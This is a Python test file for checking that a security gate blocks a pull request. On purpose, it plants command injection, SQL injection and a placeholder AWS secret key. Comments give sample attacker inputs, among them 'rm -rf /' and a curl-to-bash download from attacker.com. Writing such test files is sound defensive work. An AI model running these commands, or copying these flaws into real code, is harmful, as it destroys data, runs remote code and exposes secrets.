"""
TEST FILE — Security gate verification only.
Contains intentional vulnerabilities. DO NOT MERGE to main.
Open a PR with this file to verify the security gate fires correctly.
Expected result: Critical: 2, High: 1, merge blocked.
"""

import subprocess
import sqlite3

# VULNERABILITY 1: OS Command Injection (CRITICAL)
# subprocess.run() with shell=True and user input is exploitable.
# Attacker can run: ; rm -rf / or ; curl attacker.com/shell.sh | bash
def run_command(user_input):
    result = subprocess.run(f'echo {user_input}', shell=True, capture_output=True)
    return result.stdout

# VULNERABILITY 2: SQL Injection (CRITICAL)
# f-string directly in cursor.execute() allows SQL manipulation.
# Attacker input: " OR 1=1-- returns all rows, bypasses auth
def get_user(username):
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    cursor.execute(f'SELECT * FROM users WHERE username = "{username}"')
    return cursor.fetchall()

# VULNERABILITY 3: Hardcoded AWS Credential (HIGH)
# Any credential in source code is compromised the moment it is committed.
# Git history preserves it even after deletion.
AWS_SECRET_KEY = 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY'
